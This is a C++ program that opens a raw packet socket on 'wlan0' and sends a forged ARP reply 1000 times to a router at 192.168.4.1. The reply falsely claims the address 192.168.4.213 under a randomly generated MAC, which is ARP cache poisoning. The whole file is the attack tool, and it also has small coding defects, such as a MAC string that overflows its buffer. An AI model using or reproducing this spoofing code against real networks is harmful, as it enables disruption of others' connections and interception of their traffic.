#include<iostream>
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<netdb.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<net/ethernet.h>
#include<ifaddrs.h>
#include<linux/if_packet.h>
#include<sys/time.h>
#include<time.h>
#include"Wang-C-C-lib-/socketlib/hostInfo.cpp"

class arpreply: public infoHost{
	private:
		int send;
		char dstMAC[6];
		char srcMAC[6];
		char dstIP[4];
		char srcIP[4];
		char interface[10];

		 char *convertMac(char *macaddr){
			static char mac[6];
			char str[17];
			strcpy(str,macaddr);
			char *p;
			p=strtok(str, ":");
			
			for(int i=0;i<6;i++){
				char c=std::stoi(p,0,16);
				mac[i]=c;
				//printf("%x\n",c);
				p=strtok(NULL,":");
			}
			return mac;	
		}
		char *randomMac(char *macaddr){
			static char mac[6];
			char *temp;
			srand(time(NULL));
			double min=0;
			double max=65536;
			
			for(int i=0 ; i<6 ; i++){
				int x=(max-min)*rand()/(RAND_MAX + 1.0) + min;
				int y=htons(x);
				mac[i++]=y/256;
				mac[i]=y%256;	
			}
			return mac;
		}
		
	
	public:
		arpreply(char *interface,char *srcIP ,char *srcMac, char *dstIP, char *dstMac):infoHost(interface){	
			
					
			strcpy(this->interface,interface);
			if((send=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL)))<0){
				perror("failed to creat socket");
				exit(1);
			}
			if(inet_pton(AF_INET,dstIP,this->dstIP)!=1){
				perror("failed to convery dstIP");
				exit(1);
			}
			if(inet_pton(AF_INET,srcIP,this->srcIP)!=1){
				perror("failed to convert srcIP");
				exit(1);
			}
		
			memcpy(this->dstMAC,convertMac(dstMac),6);
			memcpy(this->srcMAC,randomMac(srcMac),6);
		}
		~arpreply(){
			close(send);
		}
		void sendreply(){
				
			uint8_t ethernet2[60];
			struct sockaddr_ll device;	
			int bytes;

			memcpy(ethernet2,this->dstMAC,6);
			memcpy(ethernet2+6,this->srcMAC,6);
			ethernet2[12]=0x08;
			ethernet2[13]=0x06;
			ethernet2[14]=0x00;
			ethernet2[15]=0x01;
			ethernet2[16]=0x08;
			ethernet2[17]=0x00;
			ethernet2[18]=0x06;
			ethernet2[19]=0x04;
			ethernet2[20]=0x00;
			ethernet2[21]=0x02;
	//----------------------------------------------------- faker sender
			memcpy(ethernet2+22,srcMAC,6);
			memcpy(ethernet2+28,srcIP,4);
			memcpy(ethernet2+32,dstMAC,6);
			memcpy(ethernet2+38,dstIP,4);
					
			device.sll_family=AF_PACKET;
			device.sll_ifindex=if_nametoindex(interface);
			memcpy(device.sll_addr,getMac(),6*sizeof(uint8_t));
			device.sll_halen=htons(6);
			
			if((bytes=sendto(send,ethernet2,sizeof(ethernet2),0,(struct sockaddr *)&device,sizeof(device)))<=0){
				perror("sendto error");
				exit(1);
			}

		}
	
	
};

int main(void ){
	char *senderIP="192.168.4.213";
	char *senderMAC="b8:27:eb:39:b8:f";
	char *routerIP="192.168.4.1";
	char *routerMAC="c8:d3:a3:68:33:d2:";

	arpreply s("wlan0",senderIP,senderMAC,routerIP,routerMAC);
	for (int i=0;i<1000;i++){
		s.sendreply();	
	}
	return 0;
}
